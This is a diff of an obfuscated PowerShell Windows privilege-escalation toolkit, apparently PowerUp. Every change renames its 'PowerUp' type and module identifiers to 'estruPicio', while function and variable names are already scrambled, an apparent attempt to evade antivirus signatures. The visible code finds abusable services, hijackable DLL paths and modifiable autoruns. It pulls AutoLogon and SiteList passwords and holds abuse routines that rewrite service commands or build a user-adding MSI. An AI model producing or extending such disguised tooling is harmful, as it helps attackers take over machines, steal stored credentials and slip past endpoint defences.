@@ -331,7 +331,7 @@ function opaque
 }
 function utility {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.ModifiablePath')]
+    [OutputType('estruPicio.ModifiablePath')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -434,7 +434,7 @@ function utility {
                             $Out | Add-Member Noteproperty 'ModifiablePath' $PNvwhyCq99
                             $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                             $Out | Add-Member Noteproperty 'Permissions' $beObThPB99
-                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
+                            $Out.PSObject.TypeNames.Insert(0, 'estruPicio.ModifiablePath')
                             $Out
                         }
                     }
@@ -444,8 +444,8 @@ function utility {
     }
 }
 function shrilly {
-    [OutputType('PowerUp.TokenGroup')]
-    [OutputType('PowerUp.TokenPrivilege')]
+    [OutputType('estruPicio.TokenGroup')]
+    [OutputType('estruPicio.TokenPrivilege')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
@@ -477,7 +477,7 @@ function shrilly {
                             $hKscXyDq99 | Add-Member Noteproperty 'SID' $gvEZfHWU99
                             $hKscXyDq99 | Add-Member Noteproperty 'Attributes' ($fKmFdDdf99.Groups[$i].Attributes -as $YTbJuixJ99)
                             $hKscXyDq99 | Add-Member Noteproperty 'TokenHandle' $WBtzsmKU99
-                            $hKscXyDq99.PSObject.TypeNames.Insert(0, 'PowerUp.TokenGroup')
+                            $hKscXyDq99.PSObject.TypeNames.Insert(0, 'estruPicio.TokenGroup')
                             $hKscXyDq99
                         }
                     }
@@ -500,7 +500,7 @@ function shrilly {
                     $wwMChOnC99 | Add-Member Noteproperty 'Privilege' $BFvYcYMu99.Privileges[$i].Luid.LowPart.ToString()
                     $wwMChOnC99 | Add-Member Noteproperty 'Attributes' ($BFvYcYMu99.Privileges[$i].Attributes -as $SNZjemra99)
                     $wwMChOnC99 | Add-Member Noteproperty 'TokenHandle' $WBtzsmKU99
-                    $wwMChOnC99.PSObject.TypeNames.Insert(0, 'PowerUp.TokenPrivilege')
+                    $wwMChOnC99.PSObject.TypeNames.Insert(0, 'estruPicio.TokenPrivilege')
                     $wwMChOnC99
                 }
             }
@@ -531,7 +531,7 @@ function shrilly {
                 $Temp = $HrZaXkBu99 -as $bdyTBjFL99
                 $DupDJUez99 | Add-Member Noteproperty 'ImpersonationLevel' $Temp.ImpersonationLevel
                 $DupDJUez99 | Add-Member Noteproperty 'TokenHandle' $WBtzsmKU99
-                $DupDJUez99.PSObject.TypeNames.Insert(0, 'PowerUp.TokenType')
+                $DupDJUez99.PSObject.TypeNames.Insert(0, 'estruPicio.TokenType')
                 $DupDJUez99
             }
             else {
@@ -543,7 +543,7 @@ function shrilly {
 }
 function aright {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.TokenGroup')]
+    [OutputType('estruPicio.TokenGroup')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -588,7 +588,7 @@ function aright {
 }
 function befogs {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.TokenPrivilege')]
+    [OutputType('estruPicio.TokenPrivilege')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -647,7 +647,7 @@ function befogs {
 }
 function perceiving {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.TokenType')]
+    [OutputType('estruPicio.TokenType')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -927,7 +927,7 @@ function seaward {
 }
 function roads {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.UnquotedService')]
+    [OutputType('estruPicio.UnquotedService')]
     [CmdletBinding()]
     Param()
     $AklewAEx99 = Get-WmiObject -Class win32_service | Where-Object {
@@ -951,7 +951,7 @@ function roads {
                 $Out | Add-Member Noteproperty 'AbuseFunction' "mockeries -Name '$($TqjMfCdH99.name)' -Path <HijackPath>"
                 $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$nSwhVpvp99)
                 $Out | Add-Member Aliasproperty Name ServiceName
-                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnquotedService')
+                $Out.PSObject.TypeNames.Insert(0, 'estruPicio.UnquotedService')
                 $Out
             }
         }
@@ -959,7 +959,7 @@ function roads {
 }
 function swig {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.ModifiableServiceFile')]
+    [OutputType('estruPicio.ModifiableServiceFile')]
     [CmdletBinding()]
     Param()
     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
@@ -978,14 +978,14 @@ function swig {
             $Out | Add-Member Noteproperty 'AbuseFunction' "tendrils -Name '$ErAwwgGa99'"
             $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$nSwhVpvp99)
             $Out | Add-Member Aliasproperty Name ServiceName
-            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableServiceFile')
+            $Out.PSObject.TypeNames.Insert(0, 'estruPicio.ModifiableServiceFile')
             $Out
         }
     }
 }
 function bearers {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.ModifiableService')]
+    [OutputType('estruPicio.ModifiableService')]
     [CmdletBinding()]
     Param()
     Get-Service | seaward -PermissionSet 'ChangeConfig' | ForEach-Object {
@@ -998,12 +998,12 @@ function bearers {
         $Out | Add-Member Noteproperty 'AbuseFunction' "tartans -Name '$($jfhkMinB99.name)'"
         $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$nSwhVpvp99)
         $Out | Add-Member Aliasproperty Name ServiceName
-        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableService')
+        $Out.PSObject.TypeNames.Insert(0, 'estruPicio.ModifiableService')
         $Out
     }
 }
 function shod {
-    [OutputType('PowerUp.ModifiableService')]
+    [OutputType('estruPicio.ModifiableService')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -1032,7 +1032,7 @@ function tartans {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
-    [OutputType('PowerUp.AbusedService')]
+    [OutputType('estruPicio.AbusedService')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -1140,7 +1140,7 @@ function tartans {
             $Out = New-Object PSObject
             $Out | Add-Member Noteproperty 'ServiceAbused' $LtdsSZAo99.Name
             $Out | Add-Member Noteproperty 'Command' $($zarCOiet99 -join ' && ')
-            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.AbusedService')
+            $Out.PSObject.TypeNames.Insert(0, 'estruPicio.AbusedService')
             $Out
         }
     }
@@ -1149,7 +1149,7 @@ function mockeries {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
-    [OutputType('PowerUp.ServiceBinary')]
+    [OutputType('estruPicio.ServiceBinary')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -1211,7 +1211,7 @@ function mockeries {
         $Out | Add-Member Noteproperty 'ServiceName' $LtdsSZAo99.Name
         $Out | Add-Member Noteproperty 'Path' $Path
         $Out | Add-Member Noteproperty 'Command' $AIExEtiS99
-        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary')
+        $Out.PSObject.TypeNames.Insert(0, 'estruPicio.ServiceBinary')
         $Out
     }
 }
@@ -1219,7 +1219,7 @@ function tendrils {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
-    [OutputType('PowerUp.ServiceBinary.Installed')]
+    [OutputType('estruPicio.ServiceBinary.Installed')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -1279,13 +1279,13 @@ function tendrils {
         }
         $rSiAIHrN99 = mockeries -Name $jfhkMinB99.Name -Command $AIExEtiS99 -Path $xuHEiXnr99
         $rSiAIHrN99 | Add-Member Noteproperty 'BackupPath' $EeoIjQHz99
-        $rSiAIHrN99.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary.Installed')
+        $rSiAIHrN99.PSObject.TypeNames.Insert(0, 'estruPicio.ServiceBinary.Installed')
         $rSiAIHrN99
     }
 }
 function doers {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.ServiceBinary.Restored')]
+    [OutputType('estruPicio.ServiceBinary.Restored')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -1313,13 +1313,13 @@ function doers {
         $Out | Add-Member Noteproperty 'ServiceName' $jfhkMinB99.Name
         $Out | Add-Member Noteproperty 'ServicePath' $xuHEiXnr99
         $Out | Add-Member Noteproperty 'BackupPath' $EeoIjQHz99
-        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary.Restored')
+        $Out.PSObject.TypeNames.Insert(0, 'estruPicio.ServiceBinary.Restored')
         $Out
     }
 }
 function ineluctably {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.HijackableDLL.Process')]
+    [OutputType('estruPicio.HijackableDLL.Process')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -1369,7 +1369,7 @@ function ineluctably {
                                 $Out | Add-Member Noteproperty 'ProcessPath' $XHrmFhih99.Path
                                 $Out | Add-Member Noteproperty 'ProcessOwner' $VAUMRNlD99
                                 $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $gESmRaxL99
-                                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Process')
+                                $Out.PSObject.TypeNames.Insert(0, 'estruPicio.HijackableDLL.Process')
                                 $Out
                             }
                         }
@@ -1384,7 +1384,7 @@ function ineluctably {
 }
 function categories {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.HijackableDLL.Path')]
+    [OutputType('estruPicio.HijackableDLL.Path')]
     [CmdletBinding()]
     Param()
     Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
@@ -1394,7 +1394,7 @@ function categories {
             if ($Null -ne $JqQJLXhC99.ModifiablePath) {
                 $JqQJLXhC99 | Add-Member Noteproperty '%PATH%' $_
                 $JqQJLXhC99 | Add-Member Aliasproperty Name '%PATH%'
-                $JqQJLXhC99.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Path')
+                $JqQJLXhC99.PSObject.TypeNames.Insert(0, 'estruPicio.HijackableDLL.Path')
                 $JqQJLXhC99
             }
         }
@@ -1404,7 +1404,7 @@ function handguns {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
-    [OutputType('PowerUp.HijackableDLL')]
+    [OutputType('estruPicio.HijackableDLL')]
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $True)]
@@ -1512,7 +1512,7 @@ function handguns {
     $Out | Add-Member Noteproperty 'Architecture' $kbTvIyjN99
     $Out | Add-Member Noteproperty 'BatLauncherPath' $fyQsdcrE99
     $Out | Add-Member Noteproperty 'Command' $JuBbfZzm99
-    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL')
+    $Out.PSObject.TypeNames.Insert(0, 'estruPicio.HijackableDLL')
     $Out
 }
 function repatriation {
@@ -1548,7 +1548,7 @@ function repatriation {
     $ErrorActionPreference = $uYyicQsj99
 }
 function patching {
-    [OutputType('PowerUp.RegistryAutoLogon')]
+    [OutputType('estruPicio.RegistryAutoLogon')]
     [CmdletBinding()]
     Param()
     $ioGVoTbx99 = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
@@ -1568,14 +1568,14 @@ function patching {
             $Out | Add-Member Noteproperty 'AltDefaultDomainName' $JOUeKJzs99
             $Out | Add-Member Noteproperty 'AltDefaultUserName' $tOzdmTww99
             $Out | Add-Member Noteproperty 'AltDefaultPassword' $hZYGrLZM99
-            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
+            $Out.PSObject.TypeNames.Insert(0, 'estruPicio.RegistryAutoLogon')
             $Out
         }
     }
 }
 function deaves {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.ModifiableRegistryAutoRun')]
+    [OutputType('estruPicio.ModifiableRegistryAutoRun')]
     [CmdletBinding()]
     Param()
     $AoJXTvLC99 = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
@@ -1600,7 +1600,7 @@ function deaves {
                 $Out | Add-Member Noteproperty 'Path' $Path
                 $Out | Add-Member Noteproperty 'ModifiableFile' $_
                 $Out | Add-Member Aliasproperty Name Key
-                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableRegistryAutoRun')
+                $Out.PSObject.TypeNames.Insert(0, 'estruPicio.ModifiableRegistryAutoRun')
                 $Out
             }
         }
@@ -1609,7 +1609,7 @@ function deaves {
 }
 function Gerard {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.ModifiableScheduledTaskFile')]
+    [OutputType('estruPicio.ModifiableScheduledTaskFile')]
     [CmdletBinding()]
     Param()
     $uYyicQsj99 = $ErrorActionPreference
@@ -1627,7 +1627,7 @@ function Gerard {
                     $Out | Add-Member Noteproperty 'TaskFilePath' $_
                     $Out | Add-Member Noteproperty 'TaskTrigger' $SQRORzAi99
                     $Out | Add-Member Aliasproperty Name TaskName
-                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
+                    $Out.PSObject.TypeNames.Insert(0, 'estruPicio.ModifiableScheduledTaskFile')
                     $Out
                 }
                 $cHOZCAwE99.Task.Actions.Exec.Arguments | utility | ForEach-Object {
@@ -1636,7 +1636,7 @@ function Gerard {
                     $Out | Add-Member Noteproperty 'TaskFilePath' $_
                     $Out | Add-Member Noteproperty 'TaskTrigger' $SQRORzAi99
                     $Out | Add-Member Aliasproperty Name TaskName
-                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
+                    $Out.PSObject.TypeNames.Insert(0, 'estruPicio.ModifiableScheduledTaskFile')
                     $Out
                 }
             }
@@ -1649,7 +1649,7 @@ function Gerard {
 }
 function discorded {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.UnattendedInstallFile')]
+    [OutputType('estruPicio.UnattendedInstallFile')]
     [CmdletBinding()]
     Param()
     $uYyicQsj99 = $ErrorActionPreference
@@ -1668,7 +1668,7 @@ function discorded {
         $Out = New-Object PSObject
         $Out | Add-Member Noteproperty 'UnattendPath' $_
         $Out | Add-Member Aliasproperty Name UnattendPath
-        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnattendedInstallFile')
+        $Out.PSObject.TypeNames.Insert(0, 'estruPicio.UnattendedInstallFile')
         $Out
     }
     $ErrorActionPreference = $uYyicQsj99
@@ -1818,7 +1818,7 @@ function Olaf {
 }
 function seamiest {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerUp.SiteListPassword')]
+    [OutputType('estruPicio.SiteListPassword')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, ValueFromPipeline = $True)]
@@ -1891,7 +1891,7 @@ function seamiest {
                                 'DecPassword' = $FaSsgNLY99;
                             }
                             $Out = New-Object -TypeName PSObject -Property $WghdlXDi99
-                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.SiteListPassword')
+                            $Out.PSObject.TypeNames.Insert(0, 'estruPicio.SiteListPassword')
                             $Out
                         }
                         catch {
@@ -2060,7 +2060,7 @@ function anaemic {
         Write-Verbose "MSI written out to '$Path'"
         $Out = New-Object PSObject
         $Out | Add-Member Noteproperty 'OutputPath' $Path
-        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UserAddMSI')
+        $Out.PSObject.TypeNames.Insert(0, 'estruPicio.UserAddMSI')
         $Out
     }
     catch {
@@ -2138,7 +2138,7 @@ function nuncio {
         $vTxilntr99 = $vTxilntr99 + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
         $vTxilntr99 = $vTxilntr99 + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
         $vTxilntr99 = $vTxilntr99 + "</style>"
-        ConvertTo-HTML -Head $vTxilntr99 -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $ndSwNPxp99
+        ConvertTo-HTML -Head $vTxilntr99 -Body "<H1>estruPicio report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $ndSwNPxp99
     }
     Write-Verbose "Running nuncio"
     $zOdlqNao99 = @(
@@ -2229,7 +2229,7 @@ function nuncio {
         Write-Verbose "[*] Report written to '$ndSwNPxp99' `n"
     }
 }
-$Module = sandbanks -ModuleName PowerUpModule
+$Module = sandbanks -ModuleName estruPicioModule
 $FunctionDefinitions = @(
     (func kernel32 GetCurrentProcess ([IntPtr]) @()),
     (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
@@ -2243,7 +2243,7 @@ $FunctionDefinitions = @(
     (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
     (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [Bool], [Int32].MakeByRefType()))
 )
-$eYtKIywi99 = bedrock $Module PowerUp.ServiceAccessRights UInt32 @{
+$eYtKIywi99 = bedrock $Module estruPicio.ServiceAccessRights UInt32 @{
     QueryConfig             =   '0x00000001'
     ChangeConfig            =   '0x00000002'
     QueryStatus             =   '0x00000004'
@@ -2265,7 +2265,7 @@ $eYtKIywi99 = bedrock $Module PowerUp.ServiceAccessRights UInt32 @{
     GenericRead             =   '0x80000000'
     AllAccess               =   '0x000F01FF'
 } -Bitfield
-$YTbJuixJ99 = bedrock $Module PowerUp.SidAttributes UInt32 @{
+$YTbJuixJ99 = bedrock $Module estruPicio.SidAttributes UInt32 @{
     SE_GROUP_MANDATORY              =   '0x00000001'
     SE_GROUP_ENABLED_BY_DEFAULT     =   '0x00000002'
     SE_GROUP_ENABLED                =   '0x00000004'
@@ -2275,14 +2275,14 @@ $YTbJuixJ99 = bedrock $Module PowerUp.SidAttributes UInt32 @{
     SE_GROUP_RESOURCE               =   '0x20000000'
     SE_GROUP_INTEGRITY_ENABLED      =   '0xC0000000'
 } -Bitfield
-$SNZjemra99 = bedrock $Module PowerUp.LuidAttributes UInt32 @{
+$SNZjemra99 = bedrock $Module estruPicio.LuidAttributes UInt32 @{
     DISABLED                            =   '0x00000000'
     SE_PRIVILEGE_ENABLED_BY_DEFAULT     =   '0x00000001'
     SE_PRIVILEGE_ENABLED                =   '0x00000002'
     SE_PRIVILEGE_REMOVED                =   '0x00000004'
     SE_PRIVILEGE_USED_FOR_ACCESS        =   '0x80000000'
 } -Bitfield
-$eKigRPEf99 = bedrock $Module PowerUp.SecurityEntity UInt32 @{
+$eKigRPEf99 = bedrock $Module estruPicio.SecurityEntity UInt32 @{
     SeCreateTokenPrivilege              =   1
     SeAssignPrimaryTokenPrivilege       =   2
     SeLockMemoryPrivilege               =   3
@@ -2319,43 +2319,43 @@ $eKigRPEf99 = bedrock $Module PowerUp.SecurityEntity UInt32 @{
     SeTimeZonePrivilege                 =   34
     SeCreateSymbolicLinkPrivilege       =   35
 }
-$NOYxPhWh99 = opaque $Module PowerUp.SidAndAttributes @{
+$NOYxPhWh99 = opaque $Module estruPicio.SidAndAttributes @{
     Sid         =   field 0 IntPtr
     Attributes  =   field 1 UInt32
 }
-$JrHJhgdG99 = bedrock $Module PowerUp.TokenTypeEnum UInt32 @{
+$JrHJhgdG99 = bedrock $Module estruPicio.TokenTypeEnum UInt32 @{
     Primary         = 1
     Impersonation   = 2
 }
-$mjTElcUO99 = opaque $Module PowerUp.TokenType @{
+$mjTElcUO99 = opaque $Module estruPicio.TokenType @{
     Type  = field 0 $JrHJhgdG99
 }
-$ftfLMDQf99 = bedrock $Module PowerUp.ImpersonationLevelEnum UInt32 @{
+$ftfLMDQf99 = bedrock $Module estruPicio.ImpersonationLevelEnum UInt32 @{
     Anonymous         =   0
     Identification    =   1
     Impersonation     =   2
     Delegation        =   3
 }
-$bdyTBjFL99 = opaque $Module PowerUp.ImpersonationLevel @{
+$bdyTBjFL99 = opaque $Module estruPicio.ImpersonationLevel @{
     ImpersonationLevel  = field 0 $ftfLMDQf99
 }
-$ZksSvkbL99 = opaque $Module PowerUp.TokenGroups @{
+$ZksSvkbL99 = opaque $Module estruPicio.TokenGroups @{
     GroupCount  = field 0 UInt32
     Groups      = field 1 $NOYxPhWh99.MakeArrayType() -MarshalAs @('ByValArray', 32)
 }
-$LUID = opaque $Module PowerUp.Luid @{
+$LUID = opaque $Module estruPicio.Luid @{
     LowPart         =   field 0 $eKigRPEf99
     HighPart        =   field 1 Int32
 }
-$ZtOvULSs99 = opaque $Module PowerUp.LuidAndAttributes @{
+$ZtOvULSs99 = opaque $Module estruPicio.LuidAndAttributes @{
     Luid         =   field 0 $LUID
     Attributes   =   field 1 UInt32
 }
-$GZzHgFhN99 = opaque $Module PowerUp.TokenPrivileges @{
+$GZzHgFhN99 = opaque $Module estruPicio.TokenPrivileges @{
     PrivilegeCount  = field 0 UInt32
     Privileges      = field 1 $ZtOvULSs99.MakeArrayType() -MarshalAs @('ByValArray', 50)
 }
-$Types = $FunctionDefinitions | whelps -Module $Module -Namespace 'PowerUp.NativeMethods'
+$Types = $FunctionDefinitions | whelps -Module $Module -Namespace 'estruPicio.NativeMethods'
 $yznQOHgS99 = $Types['advapi32']
 $Kernel32 = $Types['kernel32']
 $NTDll    = $Types['ntdll']
